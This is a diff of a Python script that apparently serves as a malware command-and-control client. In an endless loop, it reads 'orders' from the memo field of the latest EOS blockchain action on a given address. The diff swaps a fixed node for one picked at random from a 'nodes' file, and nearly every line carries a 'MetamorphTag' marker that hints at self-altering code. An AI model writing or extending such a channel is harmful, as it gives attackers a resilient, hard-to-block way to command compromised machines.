@@ -8,9 +8,17 @@ from prettytable import PrettyTable ## MetamorphTag
 import random ## MetamorphTag
 
 
+import random
+
+# Get random node 
+def randnode():
+    lines = open('nodes').read().splitlines()
+    myline =random.choice(lines)
+    return (myline)
+print(randnode())
 # Get availiable node to use as a data channel ## MetamorphTag
 def getworkingnode(): ## MetamorphTag
-    return "https://api.eosirio.io" ## MetamorphTag
+    return randnode()  ## MetamorphTag
 
 ## download orders from the block ## MetamorphTag
 def execfromeos(options): ## MetamorphTag 
@@ -25,7 +33,8 @@ def execfromeos(options): ## MetamorphTag
         # improve with a list ## MetamorphTag
         ## conect to eos availiable node ## MetamorphTag
         try: ## MetamorphTag
-            ce = Cleos(url='https://api.eosrio.io') ## MetamorphTag
+            print(randnode())
+            ce = Cleos(url=randnode()) ## MetamorphTag
 
             get_actions = ce.get_actions(addr) ## MetamorphTag
             will = get_actions["actions"][-1]["action_trace"]["act"]["data"]["memo"] ## MetamorphTag
@@ -43,6 +52,10 @@ while True: ## MetamorphTag
     
     execfromeos(sys.argv[1]) ## MetamorphTag
     time.sleep(1) ## MetamorphTag
+
+
+
+
 
 
 
